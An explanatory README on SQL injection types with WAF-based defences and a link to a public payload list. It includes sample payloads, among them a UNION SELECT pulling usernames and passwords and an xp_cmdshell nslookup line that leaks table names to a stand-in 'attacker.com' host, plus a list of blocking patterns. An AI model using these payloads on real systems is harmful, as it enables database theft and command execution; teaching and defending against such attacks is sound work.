# SQL-Injection

SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands that was not intended to be displayed.

Git Link: [SQL Injection Payload List](https://github.com/payloadbox/sql-injection-payload-list.git)

## Types of Attacks

### 1. Blind SQL Injection

It is a type of SQL injection attack where the attacker does not receive direct responses from the web application about the success or failure of SQL queries executed against the database.

#### A) Boolean-Based Blind SQL Injection

Here, the attacker sends SQL queries that result in a true or false condition.

**Example:**
Injecting a query that asks if a condition is true
```sql
WHERE username='admin' AND password LIKE 'a%'
```

If the application delays in generating a response or different error messages, the attacker can infer whether their injected condition was true or false.

#### B) Time-Based Blind SQL Injection

Another approach involves using time delays in SQL queries to infer information.

**Example:**

```sql
WAITFOR DELAY '0:0:5'
```

If the application takes longer to respond, it indicates that the condition was true.

### 2. In-Band SQL Injection

It is a type of attack where an attacker uses the same communication channel that is between the web application and backend database which is used by legitimate users for data retrieval. Attackers use this for launching the attack and collecting the results.

#### A) Error-Based SQL Injection

Error-based SQLi is an in-band SQL Injection technique that relies on error messages thrown by the database server to obtain information about the structure of the database.

**Example:**

- Actual URL: `http://example.com/product?id=10`
- Modified URL: `http://example.com/product?id=10'`
- Error Displayed: `SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1`

#### B) Union-Based SQL Injection

It is also an in-band SQL injection technique that leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response.

**Example:**

- Actual URL: `http://example.com/product?id=10`
- Modified URL: `http://example.com/product?id=10  UNION SELECT username, password FROM users`

### 3. Out-Of-Band SQL Injection

It is a type of SQL injection attack where the attacker uses different channels for sending the malicious payload and for retrieving the data. This method is typically used when the attacked web application does not return the results of the SQL query directly or when the time-based techniques are too slow or unreliable.

**Example:**

- Actual URL: `http://example.com/product?id=10`
- Payload: `10; EXEC xp_cmdshell 'nslookup ' + (SELECT name FROM sysobjects WHERE xtype='U' AND name NOT IN ('sysdiagrams')) + '.attacker.com'—`

## Preventive Measures

### 1. Input Filtering and Validation

- **SQL Injection Patterns**: Configure the WAF to block known SQL injection patterns, such as `--`, `;`, `/*`, `' OR 1=1`, and `UNION SELECT`.
- **Payload Length Checks**: Limit the length of user inputs to prevent excessively long payloads that could be used in SQL injection attacks.
- **Whitelisting and Blacklisting**: Use whitelisting to allow only safe characters in user inputs and blacklisting to block potentially dangerous inputs.

### 2. Behavioural Analysis

- **Anomaly Detection**: Enable anomaly detection to identify and block abnormal request patterns that might indicate an SQL injection attempt.
- **Rate Limiting**: Implement rate limiting to prevent attackers from making multiple rapid requests aimed at exploiting SQL injection vulnerabilities.

### 3. Response Analysis

- **Error Message Suppression**: Configure the WAF to intercept and modify or suppress error messages that could reveal SQL injection vulnerabilities.
- **Generic Error Pages**: Ensure that the application returns generic error pages without revealing database information.

### 4. Logging and Monitoring

- **Real-Time Alerts**: Set up real-time alerts for suspected SQL injection attempts so that immediate action can be taken.
- **Comprehensive Logging**: Enable detailed logging of all requests and WAF actions to facilitate forensic analysis and continuous improvement.

## Usage

Clone the repository:

```bash
git clone https://github.com/payloadbox/sql-injection-payload-list.git
cd sql-injection-payload-list
```

